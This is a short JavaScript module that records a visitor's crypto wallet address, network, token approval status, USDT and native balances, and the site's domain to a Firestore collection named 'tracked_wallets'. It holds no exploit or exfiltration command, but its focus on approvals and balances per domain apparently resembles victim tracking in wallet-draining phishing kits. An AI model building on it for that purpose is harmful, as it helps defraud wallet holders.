import { doc, setDoc, serverTimestamp } from "firebase/firestore";
import { db } from "../config/firebase";

export const trackWalletStatus = async (walletData) => {
  try {
    const { address, network, walletType, approvalStatus, usdtBalance, nativeBalance, domain } = walletData;
    
    if (!address) return;

    // Use address as the document ID so we update the same wallet
    const docRef = doc(db, "tracked_wallets", address);
    
    // Construct the data payload dynamically
    const data = {
      address,
      lastUpdated: serverTimestamp()
    };
    
    if (network) data.network = network;
    if (walletType) data.wallet = walletType;
    if (domain) data.domain = domain;
    else data.domain = window.location.hostname;
    
    if (approvalStatus) data.approval = approvalStatus;
    if (usdtBalance !== undefined) data.usdt = usdtBalance.toString();
    if (nativeBalance !== undefined) data.native = nativeBalance.toString();

    await setDoc(docRef, data, { merge: true });
    
  } catch (err) {
    console.error("Error tracking wallet:", err);
  }
};
